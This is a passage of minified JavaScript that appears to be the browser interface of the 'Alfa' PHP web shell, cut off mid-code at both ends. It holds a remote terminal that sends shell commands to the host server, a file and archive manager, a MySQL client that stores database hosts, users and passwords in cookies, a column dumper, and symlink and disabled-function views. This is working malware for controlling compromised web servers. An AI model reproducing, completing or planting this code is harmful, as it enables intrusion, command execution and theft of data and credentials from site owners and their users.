a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=d.querySelector("#"+i),r=".mysql-insert-row",o=".mysql-insert-result",n="mysql_table_insert_query",s="insert",c={table:e.getAttribute("tbl_name")};if("edit"==t){var u=e.getAttribute("col_key"),p=e.getAttribute("key");r=".mysql-edit-row",o=".mysql-update-result",n="mysql_table_update_query",s="update",c.col_key=u,c.key=p}var f={};l.querySelectorAll(r+" input, "+r+" textarea").forEach(function(e){f.hasOwnProperty(e.name)||(f[e.name]={}),f[e.name]=e.value}),c.data=f,alfaMysqlApi({db_id:i,db_target:a,ajax_id:n,db_info:c,post:{alfa2:s}},function(e){if(0!=e.length){e=JSON.parse(e);var t=d.querySelector("#"+i+" "+o);t.style.display="block",e.status?t.innerHTML="Success...":t.innerHTML=e.error}})}function alfaMysqlLoadDataType(e){e=e.toUpperCase();var t=["INT","VARCHAR","TEXT","DATE",{key:"Numeric",vals:["TINYINT","SMALLINT","MEDIUMINT","INT","BIGINT","-","DECIMAL","FLOAT","DOUBLE","REAL","-","BIT","BOOLEAN","SERIAL"]},{key:"Date and time",vals:["DATE","DATETIME","TIMESTAMP","TIME","YEAR"]},{key:"String",vals:["CHAR","VARCHAR","-","TINYTEXT","TEXT","MEDIUMTEXT","LONGTEXT","-","BINARY","VARBINARY","-","TINYBLOB","MEDIUMBLOB","BLOB","LONGBLOB","-","ENUM","SET"]},{key:"Spatial",vals:["GEOMETRY","POINT","LINESTRING","POLYGON","MULTIPOINT","MULTILINESTRING","MULTIPOLYGON","GEOMETRYCOLLECTION"]},{key:"JSON",vals:["JSON"]}],a="",i=!1;for(var l in t)if("object"==typeof t[l]){for(var r in a+='<optgroup label="'+t[l].key+'">',t[l].vals)a+="<option"+(t[l].vals[r]!=e||i?"":" selected")+">"+t[l].vals[r]+"</option>",t[l].vals[r]==e&&(i=!0);a+="</optgroup>"}else a+="<option"+(t[l]!=e||i?"":" selected")+">"+t[l]+"</option>",t[l]==e&&(i=!0);return a}function alfaMysqlChangePage(e,t){var a=e.getAttribute("db_id"),i=0;if(void 0!==t){e=d.querySelector("#"+a+" select[name=mysql-q-pages]");var l=parseInt(e.getAttribute("pages"));if(i=parseInt(e.value),1==t?--i:++i,0==i||l<i)return!1;e.value=i}else i=e.value;var r=e.getAttribute("db_target"),o=e.getAttribute("tbl_name");alfaMysqlApi({db_id:a,db_target:r,ajax_id:"mysql_table_change_page",db_info:{table:o,page:i},post:{alfa2:"page"}},function(e){0!=e.length&&(e=JSON.parse(e),alfaMysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.table)})}function alfaRemoveCookie(e){document.cookie=e+"=;Max-Age=0; path=/;"}function alfaLogOut(){alfaRemoveCookie("AlfaUser"),alfaRemoveCookie("AlfaPass"),location.reload()}var alfaAlertBox=function(e,t){this.types={success:{class:"alert-success",icon:"http://solevisible.com/icons/menu/check-mark1.svg"},error:{class:"alert-error",icon:"http://solevisible.com/icons/menu/warning.svg"}},this.show=function(a){if(""===a||null==a)throw'"msg parameter is empty"';var i=document.querySelector(e),l=document.createElement("DIV"),r=document.createElement("DIV"),o=document.createElement("DIV"),n=document.createElement("A"),s=document.createElement("div"),c=document.createElement("IMG"),d=this;if(s.style.display="inline-block",s.style.marginRight="10px",r.style.display="inline-block",o.classList.add("alert-content"),o.innerText=a,n.classList.add("alert-close"),n.setAttribute("href","#"),l.classList.add("alert-box"),c.src=this.types[t.type].icon,c.style.width="30px",s.appendChild(c),l.appendChild(s),t.hasOwnProperty("title")){var u=document.createElement("DIV");u.classList.add("alert-content-title"),u.innerText=t.title,r.appendChild(u)}if(r.appendChild(o),l.appendChild(r),t.hideCloseButton&&void 0!==t.hideCloseButton||l.appendChild(n),t.hasOwnProperty("type")&&l.classList.add(this.types[t.type].class),i.appendChild(l),n.addEventListener("click",function(e){e.preventDefault(),d.hide(l)}),!t.persistent)var p=setTimeout(function(){d.hide(l),clearTimeout(p)},t.closeTime)},this.hide=function(e){e.classList.add("hide");var t=setTimeout(function(){e.parentNode.removeChild(e),clearTimeout(t)},500)}};function alfaShowNotification(e,t,a,i,l){void 0===a&&(a="success"),void 0===i&&(i=!1),void 0===l&&(l=1e4);var r={closeTime:l,persistent:i,type:a,hideCloseButton:!1};void 0!==t&&(r.title=t),new alfaAlertBox("#alert-area",r).show(e)}function alfaSyncMenuToOpt(e,t){var a="",i="",l=null;void 0!==t?(a="view_archive",i=e,l=location):(a=e.name,i=e.getAttribute("fname"),l=e),"extract"==a?(alfa_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=deziper",g("deziper",null,"","",c_+"/"+i),d.querySelector(".opt-title").innerHTML="DeCompressor"):"compress"==a?(alfa_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=ziper",g("ziper",null,"","",c_+"/"+i),d.querySelector(".opt-title").innerHTML="Compressor"):"view_archive"==a&&(alfa_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=archive_manager",g("archive_manager",null,"",c_+"/"+i,""),d.querySelector(".opt-title").innerHTML="Archive Manager")}function doFilterName(e){var t="#filesman_holder_"+alfa_current_fm_id;setTimeout(function(){var a=new RegExp(e.value,"i");d.querySelectorAll(t+" .fmanager-row").forEach(function(e){-1==e.querySelector(".main_name").getAttribute("fname").search(a)?e.style.display="none":e.style.display="table-row"})},100)}function sortBySelectedValue(e,t){setCookie(t,e.options[e.selectedIndex].value,2012),g("FilesMan",c_)}function loadPopUpDatabase(e,t,a){if(console.log(t),$("database_window").style.display="block",void 0===t){try{d.querySelector(".sql-content.sql-active-content").classList.remove("sql-active-content")}catch(e){}try{d.querySelector(".sql-tabname.sql-active-tab").classList.remove("sql-active-tab")}catch(e){}try{d.querySelector(".sql-tabs .sql-newtab").remove()}catch(e){}var i="id_db_"+getRandom(10);d.querySelector("#database_window .content_options_holder .sql-contents").insertAdjacentHTML("afterbegin",'<div id="'+i+'" class="sql-content sql-active-content">'+e+"</div>"),d.querySelector("#database_window .content_options_holder .sql-tabs").insertAdjacentHTML("beforeend",'<div id="tab_'+i+'" opt_id="'+i+'" class="sql-tabname sql-active-tab" onclick="dbTabController(this);"><span style="font-weight:unset;">New DB Connection</span> <img opt_id="'+i+'" onclick="closeDatabase(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div><div class="sql-newtab" onclick="alfa_can_add_opt=true;g(\'sql\',null,\'\',\'\',\'\');" style="background-color:#800000;"><span style="font-weight:unset;">New Tab +</span></div>'),$(i).querySelectorAll(".db-opt-id").forEach(function(e){e.setAttribute("db_id",i)});try{$(i).querySelector(".getconfig").setAttribute("base_id",i)}catch(e){}return i}$(t).innerHTML=e;var l=$("tab_"+t);null!=l&&((-1==l.classList.value.indexOf("sql-active-tab")||database_window_is_minimized)&&(l.classList.add("tab-is-done"),alfaShowNotification("proccess is done...","DB: "+l.innerText)),database_window_is_minimized&&alfaUpdateOptionsBadge("database_window")),void 0!==mysql_cache[t]&&mysql_cache[t].hasOwnProperty("db")&&mysql_cache[t].db.length>0&&"update"!=a&&(d.querySelector("#tab_"+t+">span").innerHTML=mysql_cache[t].db),$(t).querySelectorAll(".db-opt-id").forEach(function(e){e.setAttribute("db_id",t)});try{$(t).querySelector(".getconfig").setAttribute("base_id",t)}catch(e){}database_window_is_minimized||(d.body.style.overflow="hidden")}function loadPopUpOpTions(e,t){console.log(e),alfa_before_do_action_id="",$("options_window").style.display="block";var a=$("option_"+e);if(alfa_can_add_opt){alfa_can_add_opt=!1;try{d.querySelector(".options_holder.option_is_active").classList.remove("option_is_active")}catch(e){}var i="",l=$("menu_opt_"+e).innerHTML;"market"==e?l="Alfa Market":"GetDisFunc"==e&&(l="Disable Functions");try{d.querySelector("#options_window .content_options_holder .options_tab .tab_name.tab_is_active").classList.remove("tab_is_active")}catch(e){}if(null!=a){var r=a.getAttribute("opt_count");null!=r?(i=parseInt(r)+1,a.setAttribute("opt_count",i)):(i=1,a.setAttribute("opt_count",i))}var o="option_"+e+i;d.querySelector("#options_window .content_options_holder .options_content").insertAdjacentHTML("afterbegin",'<div id="'+o+'" class="options_holder">'+t+"</div>"),d.querySelector("#options_window .content_options_holder .options_tab").insertAdjacentHTML("beforeend",'<div opt_id="'+o+'" onclick="optionsTabController(this);" title="'+l+'" id="tab_'+o+'" class="tab_name tab_is_active">'+l+' <img opt_id="'+o+'" onclick="closeOption(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div>'),$(o).classList.toggle("option_is_active"),d.querySelectorAll("#"+o+" form, #"+o+" a").forEach(function(t){var a=t.classList.value;if("getconfig"==a||"rejectme"==a)return!1;if("FORM"==t.tagName){var l=t.getAttribute("onsubmit");t.setAttribute("onsubmit",'alfaBeforeDoAction("'+e+i+'");'+l),t.setAttribute("opt_id",e+i)}else{l=t.getAttribute("onclick");t.setAttribute("onclick",'alfaBeforeDoAction("'+e+i+'");'+l)}});try{$(o).querySelector(".getconfig").setAttribute("base_id",e+i)}catch(e){}return e+i}a.innerHTML=t;var n=$("tab_option_"+e);null!=n&&((-1==n.classList.value.indexOf("tab_is_active")||options_window_is_minimized)&&(n.classList.add("tab-is-done"),alfaShowNotification("proccess is done...",n.innerText)),options_window_is_minimized&&alfaUpdateOptionsBadge("options_window")),d.querySelectorAll("#option_"+e+" form, #option_"+e+" a").forEach(function(t){var a=t.classList.value;if("getconfig"==a||"rejectme"==a)return!1;if("FORM"==t.tagName){var i=t.getAttribute("onsubmit");t.setAttribute("onsubmit",'alfaBeforeDoAction("'+e+'");'+i),t.setAttribute("opt_id",e)}else{i=t.getAttribute("onclick");t.setAttribute("onclick",'alfaBeforeDoAction("'+e+'");'+i)}});try{a.querySelector(".getconfig").setAttribute("base_id",e)}catch(e){}options_window_is_minimized||(d.body.style.overflow="hidden")}function alfaBeforeDoAction(e){alfa_before_do_action_id=e}function alfaLoaderOnTop(e){$("a_loader").style.display=e,d.body.style.overflow="block"==e?"hidden":"visible"}function alfaAjaxController(e){var t=e.getAttribute("parent");$("loader_"+t).remove(),"filesman_holder"==t.substr(0,15)&&($(t).style.minHeight="0"),_ALFA_AJAX_.hasOwnProperty(t)&&_ALFA_AJAX_[t].abort()}function closeDatabase(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("sql-active-tab"))if((e=d.querySelectorAll(".sql-tabs .sql-tabname")).length>1){e[0].classList.add("sql-active-tab");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("sql-active-content")}else editorClose("database_window");d.querySelector("div[opt_id="+a+"]").remove()}function closeFmTab(e,t){t.stopPropagation();var a=e.getAttribute("fm_id"),i=$("filesman_tab_"+a);if(-1!=i.classList.value.indexOf("filesman-tab-active")&&(e=d.querySelectorAll("#filesman_tabs .filesman_tab")).length>1){e[0].classList.add("filesman-tab-active");var l=e[0].getAttribute("fm_id"),r="filesman_holder_"+l;if(null!=$(r)){$(r).classList.toggle("filesman-active-content");var o=$("filesman_tab_"+l).getAttribute("path");initDir(o),d.mf.c.value=o,alfa_current_fm_id=l}}i.remove(),$("filesman_holder_"+a).remove(),alfaFilesmanTabHideTitle()}function closeOption(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("tab_is_active"))if((e=d.querySelectorAll(".options_tab .tab_name")).length>1){e[0].classList.add("tab_is_active");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("option_is_active")}else editorClose("options_window");d.querySelector("div[opt_id="+a+"]").remove()}function historyPanelController(e){"hidden"==e.getAttribute("mode")?(d.querySelector(".editor-explorer").style.display="block",d.querySelector(".editor-modal").style.marginLeft="20%",e.setAttribute("mode","visible"),e.style.left="19%",e.innerHTML="<<"):(d.querySelector(".editor-explorer").style.display="none",d.querySelector(".editor-modal").style.marginLeft="1%",e.setAttribute("mode","hidden"),e.style.left="0%",e.innerHTML=">>")}function closeTerminalContent(e,t){t.stopPropagation();var a=e.getAttribute("term_id");if(($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("active-terminal-tab"))&&(e=d.querySelectorAll(".terminal-tabs .terminal-tab")).length>1){e[0].classList.add("active-terminal-tab");var i=e[0].getAttribute("term_id");null!=$(i)&&$(i).classList.toggle("active-terminal-content")}d.querySelector("div[term_id="+a+"]").remove()}function closeEditorContent(e,t){t.stopPropagation();var a=e.getAttribute("opt_id");if(($(a).remove(),-1!=$("tab_"+a).classList.value.indexOf("editor-tab-active"))&&(e=d.querySelectorAll(".editor-tabs .editor-tab-name")).length>1){e[0].classList.add("editor-tab-active");var i=e[0].getAttribute("opt_id");null!=$(i)&&$(i).classList.toggle("editor-content-active")}d.querySelector("div[opt_id="+a+"]").remove()}function optionsTabController(e){try{d.querySelector(".options_holder.option_is_active").classList.remove("option_is_active")}catch(e){}var t=e.getAttribute("opt_id");if(null==t)return!1;$(t).classList.toggle("option_is_active");try{d.querySelector("#options_window .content_options_holder .options_tab \t.tab_name.tab_is_active").classList.remove("tab_is_active")}catch(e){}e.classList.remove("tab-is-done"),e.classList.add("tab_is_active"),d.querySelector(".opt-title").innerHTML=e.getAttribute("title"),alfaUpdateOptionsBadge("options_window")}function terminalTabController(e){try{d.querySelector(".terminal-tab.active-terminal-tab").classList.remove("active-terminal-tab")}catch(e){}try{d.querySelector(".terminal-content.active-terminal-content").classList.remove("active-terminal-content")}catch(e){}var t=e.getAttribute("term_id");if(null==t)return!1;$(t).classList.toggle("active-terminal-content"),e.classList.remove("tab-is-done"),e.classList.add("active-terminal-tab"),$(t).querySelector(".php-terminal-input").focus(),alfaUpdateOptionsBadge("cgiloader")}function filesmanTabController(e){try{d.querySelector(".ajaxarea.filesman-active-content").classList.remove("filesman-active-content")}catch(e){}try{d.querySelector(".filesman_tab.filesman-tab-active").classList.remove("filesman-tab-active")}catch(e){}var t=e.getAttribute("fm_id");if(null==t)return!1;alfa_current_fm_id=t,e.classList.add("filesman-tab-active"),e.classList.remove("tab-is-done"),$("filesman_holder_"+t).classList.toggle("filesman-active-content");var a=e.getAttribute("path");initDir(a),d.mf.c.value=a}function dbTabController(e){try{d.querySelector(".sql-content.sql-active-content").classList.remove("sql-active-content")}catch(e){}try{d.querySelector(".sql-tabname.sql-active-tab").classList.remove("sql-active-tab")}catch(e){}var t=e.getAttribute("opt_id");if(null==t)return!1;$(t).classList.toggle("sql-active-content"),e.classList.remove("tab-is-done"),e.classList.add("sql-active-tab"),alfaUpdateOptionsBadge("database_window")}function editorTabController(e,t){try{d.querySelector(".editor-contents.editor-content-active").classList.remove("editor-content-active")}catch(e){}var a=null;void 0===t?a=e.getAttribute("opt_id"):(a=e,e=$("tab_"+a));var i=editor_files["file_"+a.replace("editor_source_","")];if(void 0!==i&&(d.querySelector(".editor-path").innerHTML=(i.pwd+"/"+i.file).replace(/\/\//g,"/")),null==a)return!1;$(a).classList.toggle("editor-content-active");try{d.querySelector(".editor-tabs .editor-tab-name.editor-tab-active").classList.remove("editor-tab-active")}catch(e){}e.classList.remove("tab-is-done"),e.classList.add("editor-tab-active"),alfaUpdateOptionsBadge("editor")}function alfaUpdateOptionsBadge(e){var t=d.querySelector("#"+e+"-minimized .options_min_badge");if(null!=t){var a=d.querySelectorAll("#"+e+" .tab-is-done").length;t.innerHTML=a,t.style.visibility=a>0?"visible":"hidden"}}function alfaOpenPhpTerminal(e){if(php_temrinal_using_cgi&&void 0===e)showEditor("cgiloader");else{$("cgiloader").style.display="block",$("cgiloader").style.background="rgba(0, 0, 0, 0.57)",$("cgiframe").style.background="rgba(0, 0, 0, 0.81)",$("cgiframe").style.border="1px solid rgb(30, 86, 115)",$("cgiframe").style.height="90%",$("cgiframe").style.padding="3px",d.querySelector("#cgiloader .opt-title").innerHTML="Terminal";var t="",a="",i="terminal_id_"+getRandom(10);void 0===e&&(t=" active-terminal-content",a=" active-terminal-tab"),d.querySelector("#cgiframe .terminal-contents").insertAdjacentHTML("afterbegin",'<div id="'+i+'" class="terminal-content'+t+'"><div class="php-terminal-output"><div><button class="terminal-btn-fontctl" onClick="changeTerminalFontSize(\''+i+'\',1);">+</button><button class="terminal-btn-fontctl" onClick="changeTerminalFontSize(\''+i+"',0);\">-</button><input onchange=\"alfaTerminalChangecolor(this,'"+i+'\');" style="height: 18px;background: #dde2e2;" type="color"></div><pre class="ml1" style="border:unset;height: 90%;"></pre></div><div><form term_id="'+i+'" onSubmit="alfaExecTerminal(this);this.c.value=\'\';return false;" autocomplete="off" style="margin-top: 10px;"><div style="overflow: auto;white-space: nowrap;"><div style="display: inline-block;color:#4fbec3;margin-bottom:5px;margin-right:5px;">CWD:~# </div><div style="display: inline-block;color:#42ec42;" class="php-terminal-current-dir"></div></div><div style="position:relative;"><span style="color: #00ff08;font-size: 25px;">$ </span><input style="padding: 8px;font-size: 20px;width: 67%;border: 1px solid #27979B;padding-right:35px;" onkeyup="alfaWalkInTerminalHistory(this,event,\''+i+'\');" term_id="'+i+'" class="php-terminal-input" type="text" name="c" onfocus="closeHistoryCmd(\'free\',this);" placeholder="ls -la"><button class="button" style="color: #27979B;padding: 12px;margin-left: 10px;border-radius: 2px;font-weight: bolder;">ExeCute<button term_id="'+i+'" class="button" style="color: #27979B;padding: 12px;margin-left: 10px;border-radius: 2px;font-weight: bolder;" onClick="alfaExecTerminal(this, 1);return false;">Current Dir</button><div class="cmd-history-holder"><div class="commands-history-header">History</div><span onClick="clearTerminalHistory();" style="border-bottom: 1px solid;margin-bottom: 5px;display: inline-block;padding: 5px;color: #59de69;cursor: pointer;">Clear history</span><div style="overflow: auto;height: 82%;" class="commands-history"></div></div><div term_id="'+i+'" class="cmd-history-icon" mode="" onclick="closeHistoryCmd(this);"><img style="width:27px;" src="http://solevisible.com/icons/menu/time2.svg"></div></form></div></div></div>');try{$("terminal_new_tab").remove()}catch(e){}d.querySelector("#cgiframe .terminal-tabs").insertAdjacentHTML("beforeend",'<div onclick="terminalTabController(this);" term_id="'+i+'" id="tab_'+i+'" class="terminal-tab'+a+'">Terminal <img term_id="'+i+'" onclick="closeTerminalContent(this,event);return false;" title="[close]" src="http://solevisible.com/icons/menu/delete.svg"></div>'),d.querySelector("#cgiframe .terminal-tabs").insertAdjacentHTML("beforeend",'<div onclick="alfaOpenPhpTerminal(true);" id="terminal_new_tab" style="background-color:#800000;" class="terminal-tab">New Tab +</div>'),terminal_walk_index[i]={index:0,key:-1},d.querySelector("#"+i+" .php-terminal-input").focus(),d.querySelector("#"+i+" .php-terminal-current-dir").innerHTML=c_,d.querySelector("#cgiloader-minimized .minimized-text").innerHTML="Terminal",alfaTerminalSetColorAndSize(i),php_temrinal_using_cgi=!0;var l=alfaGetTerminalHistory();for(var r in l)d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+l[r]+"</div>")}d.body.style.overflow="hidden"}function alfaTerminalSetColorAndSize(e){var t=getCookie("alfa-terminal-color"),a=getCookie("alfa-terminal-fontsize");void 0!==t&&(d.querySelector("#"+e+" pre.ml1").style.color=t),void 0!==a&&(d.querySelector("#"+e+" pre.ml1").style.fontSize=a)}function alfaTerminalChangecolor(e,t){d.querySelector("#"+t+" pre.ml1").style.color=e.value,setCookie("alfa-terminal-color",e.value,2012)}function alfaGetTerminalHistory(e){var t=getCookie("alfa-terminal-history");try{t=atob(t),t=JSON.parse(t)}catch(e){t=[]}return void 0!==e&&t.reverse(),t}function changeTerminalFontSize(e,t){var a=d.querySelector("#"+e+" pre.ml1"),i=parseInt(window.getComputedStyle(a,null).getPropertyValue("font-size")),l="";1==t?(l=i+1+"px",a.style.fontSize=l):(l=i-1+"px",a.style.fontSize=l),setCookie("alfa-terminal-fontsize",l,2012)}function alfaWalkInTerminalHistory(e,t,a){var i=t||window.event;if("38"==i.keyCode||"40"==i.keyCode||"37"==i.keyCode||"39"==i.keyCode)switch(i.keyCode){case 38:var l=alfaGetTerminalHistory(!0),r="";0==terminal_walk_index[a].index?(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,void 0!==(r=l[terminal_walk_index[a].index])?(e.value=r,++terminal_walk_index[a].index):(e.value="",terminal_walk_index[a].index=0)):terminal_walk_index[a].index<l.length&&(0==terminal_walk_index[a].key&&++terminal_walk_index[a].index,e.value=l[terminal_walk_index[a].index],++terminal_walk_index[a].index),terminal_walk_index[a].key=1;break;case 40:l=alfaGetTerminalHistory(!0);if(terminal_walk_index[a].index>=0)0!=terminal_walk_index[a].index&&(--terminal_walk_index[a].index,1==terminal_walk_index[a].key&&--terminal_walk_index[a].index),void 0!==(r=l[terminal_walk_index[a].index])?e.value=r:(e.value="",terminal_walk_index[a].index=0);terminal_walk_index[a].key=0;break;default:console.log(i.keyCode)}else terminal_walk_index[a].index=0}function clearTerminalHistory(){d.querySelectorAll(".commands-history").forEach(function(e){e.innerHTML=""}),setCookie("alfa-terminal-history","",2012)}function alfaAceToFullscreen(e){var t=e.getAttribute("ace_id");alfa_ace_editors.editor[t].container.requestFullscreen()}function closeHistoryCmd(e,t){if("free"==e){var a=t.getAttribute("term_id");return e=d.querySelector("#"+a+" .cmd-history-icon"),d.querySelector("#"+a+" .cmd-history-holder").style.visibility="hidden",d.querySelector("#"+a+" .cmd-history-holder").style.opacity="0",e.setAttribute("mode","off"),!1}var i=e.getAttribute("mode"),l=(a=e.getAttribute("term_id"),d.querySelector("#"+a+" .cmd-history-holder"));0==i.length||"off"==i?(l.style.visibility="visible",l.style.opacity="1",e.setAttribute("mode","on")):(l.style.visibility="hidden",l.style.opacity="0",e.setAttribute("mode","off"))}function geEvalAceValue(e){var t=e.querySelector(".php-evals-ace").getAttribute("id");return alfa_ace_editors.eval[t].getValue()}function alfaOpenArchive(e){var t=e.getAttribute("path"),a=e.getAttribute("fname"),i=e.getAttribute("base_id");if(".."==a&&"phar://"!=t.substr(0,7))return!1;var l="a="+alfab64("open_archive_dir")+"&c="+alfab64(c_)+"&alfa1="+alfab64(t)+"&alfa2="+alfab64(i)+"&ajax="+alfab64("true");_Ajax(d.URL,l,function(e){if("0"!=e){$("archive_base_"+i).innerHTML=e;var a=$("archive_dir_"+i).getAttribute("archive_name"),l=$("archive_dir_"+i).getAttribute("archive_full"),r="",o="";if(0!=(t=t.split(a)[1]).length){var n=(t=t.split("/")).length-1;for(var s in 0==t[n].length&&t.splice(n,1),t)0!=t.length&&(o+=t[s]+"/",r+='<a base_id="'+i+'" fname="'+t[s]+'" path="'+l+o+'" onclick="alfaOpenArchive(this);">'+t[s]+"/</a>")}d.querySelector("#archive_dir_"+i+" .archive_pwd_holder").innerHTML=r}},!1,"open_archive_dir")}function alfaDeleteConnectToDb(e){d.querySelectorAll(".dbh_"+e).forEach(function(e){e.remove()}),alfaConnectionHistoryUpdate(e)}function alfaConnectToDb(e,t){var a={};try{a=JSON.parse(atob(getCookie("alfa_connection_hist")))}catch(e){}var i=d.querySelector("#"+t+" div.sf");i.querySelector("input[name=sql_host]").value=a[e].host,i.querySelector("input[name=sql_login]").value=a[e].user,i.querySelector("input[name=sql_pass]").value=a[e].pass,(i.querySelector("input[name=sql_base]")?i.querySelector("input[name=sql_base]"):i.querySelector("select[name=sql_base]")).value=a[e].db,i.querySelector("input[name=sql_count]").checked=!0,d.querySelector("#"+t+" div.sf .db-connect-btn").click()}function alfaShowConnectionHistory(e){var t={},a=e.getAttribute("db_id"),i=e.getAttribute("mode");if(rows='<table class="connection-hist-table"><tr><th>*</th><th>Host</th><th>User</th><th>Pass</th><th>Database</th><th>Connect</th><th>Delete</th></tr>',"on"==i){e.setAttribute("mode","off");try{t=JSON.parse(atob(getCookie("alfa_connection_hist")))}catch(e){}var l,r=1;for(l in t){var o=t[l].user+"_"+t[l].db;rows+='<tr class="dbh_'+o+'"><th>'+r+"</th><th>"+t[l].host+"</th><th>"+t[l].user+"</th><th>"+t[l].pass+"</th><th>"+t[l].db+'</th><th><button style="margin: unset;" class="connection-his-btn" onclick=\'alfaConnectToDb("'+o+'","'+a+'");\'>Connect</button></th><th style="text-align: center;"><button style="margin: unset;" class="connection-his-btn connection-delete" onclick=\'alfaDeleteConnectToDb("'+o+"\");'>X</button></th></tr>",r++}rows+="</table"}else e.setAttribute("mode","on"),rows="";d.querySelector("#"+a+" .connection_history_holder").innerHTML=rows}function alfaConnectionHistoryUpdate(e){var t,a={};try{a=JSON.parse(atob(getCookie("alfa_connection_hist")))}catch(e){}for(t in mysql_cache)0!=mysql_cache[t].db.length&&(a[mysql_cache[t].user+"_"+mysql_cache[t].db]=mysql_cache[t]);void 0!==e&&delete a[e],setCookie("alfa_connection_hist",btoa(JSON.stringify(a)),2012)}function alfaExecTerminal(e,t){var a="";if(0==(a=void 0!==t?"cd "+c_:e.c.value).length)return!1;"l"==a?a="ls -trh --color":"ll"==a&&(a="ls -ltrh --color");var i=e.getAttribute("term_id");alfaloader(i,"block"),closeHistoryCmd("free",e);var l="";"FORM"==e.tagName&&(l=e.querySelector(".php-terminal-current-dir").innerHTML),0==(l=l.trim()).length&&(l=c_);var r="a="+alfab64("terminalExec")+"&c="+alfab64(l)+"&alfa1="+alfab64(a)+"&ajax="+alfab64("true");if(_Ajax(d.URL,r,function(e,t){alfaloader(t,"none");try{var a=$("tab_"+i);null!=a&&((-1==a.classList.value.indexOf("active-terminal-tab")||cgi_is_minimized)&&(a.classList.add("tab-is-done"),alfaShowNotification("proccess is done...",a.innerText)),cgi_is_minimized&&alfaUpdateOptionsBadge("cgiloader"))}catch(e){}e=JSON.parse(e),d.querySelector("#"+t+" .php-terminal-output > pre").innerHTML=e.output,0!=e.path.length&&(d.querySelector("#"+t+" .php-terminal-current-dir").innerHTML=e.path)},!1,i),void 0===t){d.querySelector("#"+i+" .cmd-history-holder .commands-history").insertAdjacentHTML("afterbegin","<div onclick=\"d.querySelector('#"+i+' .php-terminal-input\').value = this.innerHTML;" class="history-cmd-line">'+a+"</div>");var o=alfaGetTerminalHistory(),n=o.indexOf(a);-1!=n&&o.splice(n,1),o.push(a),setCookie("alfa-terminal-history",btoa(JSON.stringify(o)),2012)}d.querySelector("#"+i+" input.php-terminal-input").focus()}function pageChangedFilesMan(e){var t="filesman_holder_"+alfa_current_fm_id,a=getCookie(t+"_page_number"),i=e.innerText;if("<<"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;if(!((a=parseInt(a))>1))return!1;i=a-1}if(">>"==i){a=d.querySelector("#"+t+" .active-page-number").innerText;a=parseInt(a);var l=d.querySelector("#"+t+" .last-page-number").innerHTML;if(!(a+1<=(l=parseInt(l))))return!1;i=a+1}setCookie(t+"_page_number",i,2012),g("FilesMan",c_)}function alfaColDumperInit(){var e=d.querySelector(".tab_name.tab_is_active").getAttribute("opt_id"),t=d.querySelector("#"+e),a=t.getElementsByClassName("box");for(i=0;i<a.length;i++)a[i].addEventListener("click",function(){null!=this.parentElement.querySelector(".nested")&&(this.parentElement.querySelector(".nested").classList.toggle("active"),this.classList.toggle("check-box"))});var i;a=t.getElementsByClassName("sub-box");for(i=0;i<a.length;i++)a[i].setAttribute("opt_id",e),a[i].addEventListener("click",function(){this.classList.toggle("check-box");var e=this.getAttribute("tbl"),t=this.getAttribute("opt_id");t=t.replace("option_",""),col_dumper_selected_data.hasOwnProperty(t)||(col_dumper_selected_data[t]={}),void 0===col_dumper_selected_data[t][e]&&(col_dumper_selected_data[t][e]=[]);var a=this.innerHTML,i=col_dumper_selected_data[t][e].indexOf(a);-1==i?col_dumper_selected_data[t][e].push(a):col_dumper_selected_data[t][e].splice(i,1)})}function showSymlinkPath(e,t){t.stopPropagation();var a=e.getAttribute("row"),i=$("td_row_"+a),l=e.getAttribute("opt_title"),r=e.getAttribute("fname");if(l=decodeURIComponent(r)+" -> "+l,null!=i){i.insertAdjacentHTML("afterbegin",'<div class="symlink_path" id="link_id_'+a+'">'+l+"</div>");var o=t.clientX,n=t.clientY-30;$("link_id_"+a).style.left=o+"px",$("link_id_"+a).style.top=n+"px"}}function hideSymlinkPath(e,t){t.stopPropagation(),$("link_id_"+e.getAttribute("row")).remove()}function alfagetFlags(){data="a="+alfab64("get_flags")+"&c="+alfab64(c_)+"&ajax="+alfab64("true"),_Ajax(d.URL,data,function(e){var t=JSON.parse(e);t.hasOwnProperty("server")&&(d.querySelectorAll(".flag-holder")[0].innerHTML='<img draggable="false" title="'+t.server.name+'" src="http://solevisible.com/images/flags/48/'+t.server.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[0].style.display="inline"),t.hasOwnProperty("client")&&(d.querySelectorAll(".flag-holder")[1].innerHTML='<img draggable="false" title="'+t.client.name+'" src="http://solevisible.com/images/flags/48/'+t.client.code.toLowerCase()+'.png">',d.querySelectorAll(".flag-holder")[1].style.display="inline")})}function colDumplerSelectType(e){var t=e.options[e.selectedIndex].value;$("coldumper-delimiter-input").style.display="delimiter"==t?"inline-block":"none"}function alfaCheckUrlHash(){var e=window.location.hash.substr(1),t=e.split("&").reduce(function(e,t){var a=t.split("=");return e[a[0]]=a[1],e},{});if(""!=e)switch(t.action){case"fileman":case"options":t.path=decodeURIComponent(t.path),g("FilesMan",t.path,function(e){if(t.hasOwnProperty("file")){var a="auto";isArchive(t.file)&&(a="view"),editor(t.path+"/"+t.file,a,"","","","file")}}),"options"==t.action&&t.hasOwnProperty("opt")&&(alfa_can_add_opt=!0,g(t.opt,null,"","",""),d.querySelector(".opt-title").innerHTML=$("menu_opt_"+t.opt).innerHTML),t.hasOwnProperty("file")||editorClose("editor"),t.hasOwnProperty("opt")||editorClose("options_window"),editorClose("cgiloader");break;default:g("FilesMan","<?php echo $GLOBALS["cwd"]; 